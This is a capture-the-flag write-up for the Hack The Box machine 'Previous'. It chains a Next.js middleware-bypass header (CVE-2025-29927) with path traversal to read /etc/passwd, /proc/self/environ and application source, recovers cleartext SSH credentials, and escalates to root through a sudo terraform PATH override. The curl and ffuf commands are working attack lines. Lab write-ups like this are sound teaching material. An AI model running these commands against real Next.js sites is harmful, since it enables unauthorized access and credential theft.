---
title: 'HTB-Previous'
published: 2025-09-17
draft: false
toc: true
---

```
Scope:
10.10.11.83
```

# Recon
## Nmap

```bash
sudo nmap -sV -sC -sT -p- 10.10.11.83 -T5 --min-rate=5000 -vvvv -Pn

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: PreviousJS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80/TCP - HTTP

![](attachments/31644a58111af46938059dd22e4634e3.png)

Clicking ond **Docs** takes me to the following screen:

![](attachments/af998c29fe1c64cd92399c219b5f79f7.png)

I tried out using `admin - admin` and saw the following result:

![](attachments/70263e4e95c7283815777c61e73cba41.png)

### CVE-2025-29927

Since I found nothing else useful I decided to look it up online:

![](attachments/f3f11d14ac403c797ef8a4270f159944.png)

>[!quote]+
>The vulnerability lies in the fact that this header check can be exploited by external users. By adding the x-middleware-subrequest header with the correct value to a request, an attacker can completely bypass any middleware-based protection mechanisms.Here's how the vulnerability works at the code level Javascript

![](attachments/84920c11c9343f658787230591fe1279.png)

Following up there was a whole text about which **NextJS** version could be exploited in what way so I decided to check the current version running:

![](attachments/1b4be2e88c5f833b8904688b45a2ed37.png)

This version probably falls under the following:

![](attachments/6aae05717a51bf69c8e7c6871d257f9c.png)

Using this knowledge I ran `dirrsearch` using the `-H` (header) option with the above exploit:

```bash
dirsearch -u http://previous.htb/api -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'
```

![](attachments/bf2005319e5fd8229dc430b3d5d15f5b.png)

### Parameter Fuzzing 

Using the `burp-parameter-names.txt` I fuzzed the parameter that was associated with the `/download?` endpoint:

```bash
ffuf -u 'http://previous.htb/api/download?FUZZ=a' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' -mc all -fw 2
```

![](attachments/5b95bdec6479bf490f49298de47a234b.png)

>[!danger]+
>Don't forget to include the `-mc all` and `-fw 2` options or it won't show up as the status code is `404`:
>
> ![](attachments/ce11e29ec66a36337fb8a4786178dc63.png)

### LFI

As for further testing I started off with **Path Traversal**:

```bash
curl 'http://previous.htb/api/download?example=../../../../../etc/passwd' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware' -v
```

![](attachments/96444dbcdc1b2ece827445cf10b160b0.png)

So what can we do now? I tried checking for `ssh` keys but wasn't able to read any if they even existed.

Instead I checked the following:

![](attachments/68c39ba6f1683b52ec29dd8773e21a7d.png)

The `/proc/self/environ` file was especially useful here.

![](attachments/4e336958a2ef03eab7ff9520927b96ce.png)

```
NODE_VERSION=18.20.8
HOSTNAME=0.0.0.0
YARN_VERSION=1.22.22
SHLVL=1
PORT=3000
HOME=/home/nextjs
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NEXT_TELEMETRY_DISABLED=1
PWD=/app
NODE_ENV=production
```

We now have gathered that the directory we should be looking in is called `/app`, but what sub-folders does it contain?

#### NextJS sub-folder structure.

![](attachments/a575902b8f48b733194e327b916ff14f.png)

Looking further into the `next/` directory:

![](attachments/23f2b766de996931093446803e67f92d.png)

Using this command I could then see the endpoint logic:

```bash
curl 'http://previous.htb/api/download?example=../../../../../app/.next/routes-manifest.json' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware' -v --output -
```

![](attachments/523d38cfee796ff8c9babe54d1f8a476.png)

The `/api/auth/[...nextauth]` is especially telling since it explains the authentication logic.

Going back to what other sub-folders are compiled within `.next/`:

![](attachments/e6739dedd1271018f01eef39ecf899ff.png)

Diving deeper into `server/pages` now.

![](attachments/237759e222651204dd3cc21099345e69.png)

This needs to be URL encoded.

![](attachments/2c12ff33b5e3e286075eb00f5d89fe73.png)

```bash
curl 'http://previous.htb/api/download?example=../../../../../app/.next/server/pages/api/auth/%5b...nextauth%5d.js' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware' -v --output -
```

![](attachments/3d71bdf31a8d17aabea40e1ac07ce15d.png)

We get a set of cleartext credentials out of it!

```
Jeremy
MyNameIsJeremyAndILovePancakes
```

# Foothold
## ssh as Jeremy

We can log in as *Jeremy* which is odd since he was not present inside the `/etc/passwd` list.

![](attachments/9f3ce865a207f206d7ea875050c37590.png)

### user.txt

![](attachments/b384a2ab39472055b80a359aa6c6b7b6.png)

>[!note]+
>Seeing the presence of the `docker` interface means that the web instance was HIGHLY LIKELY running from there.
>
>![](attachments/0326241be46f5741af61710d11d0e5a2.png)

## Enumeration

Continuing on I noticed the `.terraformrc` file so I checked `sudo -l`:

![](attachments/1172ed9d92d7301e16525c5cd015d13d.png)

So what does this binary actually do?

![](attachments/ac06beab47ec020e9e125172645adda3.png)

### Terraform

Diving deeper into `/opt/examples` I find this:

![](attachments/c1d5d661e2ac9df896f120e4420cf9d0.png)

:::note
My current user does *not* have any write privileges.
:::

I took a dive into [the docs](https://developer.hashicorp.com/terraform/cli/config/environment-variables) where I found:

![](attachments/dac5d95ea99d52d9febe1a371af5ee8a.png)

# Privilege Escalation
## Abusing Terraform

I noticed that the PATH was set to the following:

![](attachments/6444fb1ce78bbd0e1a06c72b8ef8c252.png)

So I changed it to `/tmp` whereafter I added the following.

![](attachments/bab1c54fbf31e1984885973ad1a48d81.png)

I then ran the command:

![](attachments/0dc44220f27bdfb3ba81943ae48a5871.png)

I could then verify it using `ls -la`:

![](attachments/5d3cd0d86c98a2451eee4a3bfe5d0cbe.png)

Now all that's left is to `/bin/bash -p`:

![](attachments/86b22a7079c187890580cb8b855dc226.png)

### root.txt

![](attachments/89e3b8ff1b1920b71e97a086471d0773.png)

![](attachments/0dd94ca00be8bec14b80a198c87d62ca.png)

---